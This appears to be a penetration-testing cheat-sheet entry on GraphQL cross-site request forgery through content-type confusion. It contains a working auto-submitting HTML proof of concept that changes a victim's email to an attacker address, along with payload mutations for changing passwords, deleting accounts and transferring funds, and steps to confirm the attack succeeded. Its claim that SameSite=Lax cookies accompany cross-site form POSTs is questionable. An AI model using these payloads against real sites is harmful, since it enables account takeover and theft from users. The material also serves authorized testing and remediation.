# GraphQL CSRF (Content-Type Confusion)

## When this applies

- Endpoint accepts `application/x-www-form-urlencoded` (or `multipart/form-data`) for GraphQL queries.
- No CSRF tokens are required; SameSite cookies are not Strict.
- A privileged mutation can change state (changeEmail, transferMoney, deleteAccount).

## Technique

Build an HTML form that submits a `query=mutation{...}` body to the GraphQL endpoint. The browser auto-sends authenticated cookies. With form-urlencoded content-type, no preflight is required.

## Steps

### Requirements

- Endpoint accepts `application/x-www-form-urlencoded`
- No CSRF tokens
- No SameSite cookie protection

### CSRF PoC

```html
<form action="https://target.com/graphql" method="POST">
  <input type="hidden" name="query" value="mutation{changeEmail(input:{email:\"attacker@evil.com\"}){email}}" />
</form>
<script>document.forms[0].submit();</script>
```

### Vulnerable mutation candidates

```graphql
# Email change mutation (vulnerable if accepts URL-encoded)
mutation {
  changeEmail(input: {email: "attacker@evil.com"}) {
    email
    success
  }
}

# Password change
mutation {
  changePassword(input: {newPassword: "hacked123"}) {
    success
  }
}

# Delete account
mutation {
  deleteAccount {
    success
  }
}

# Transfer funds
mutation {
  transferMoney(input: {to: "attacker", amount: 1000}) {
    transactionId
    success
  }
}
```

### Test content-type acceptance

Try each on the `/graphql` endpoint to find which is accepted:

```http
# JSON (standard, NOT CSRF-vulnerable)
Content-Type: application/json

# URL-encoded (CSRF-vulnerable if accepted)
Content-Type: application/x-www-form-urlencoded

# GraphQL-specific
Content-Type: application/graphql

# Form data
Content-Type: multipart/form-data
```

## Verifying success

- Submitting the HTML form from `attacker.com` while authenticated to `target.com` causes the mutation to fire.
- Re-fetching the user profile shows the new email / password / state.
- Server returns 200 with mutation success body even though the request originated cross-origin.

## Common pitfalls

- Modern Apollo Server (v3+) requires `apollo-require-preflight: true` header by default — blocks CSRF unless misconfigured.
- `SameSite=Lax` cookies still ride along on top-level POST submissions (form action) — but not on fetch() with credentials.
- Some apps validate Origin/Referer at the GraphQL layer — test with both headers stripped (curl -H "Origin:") and forged.

## Tools

- Burp Suite (CSRF PoC generator)
- curl (`-H "Content-Type: application/x-www-form-urlencoded"`)
- Browser DevTools (test form submission)
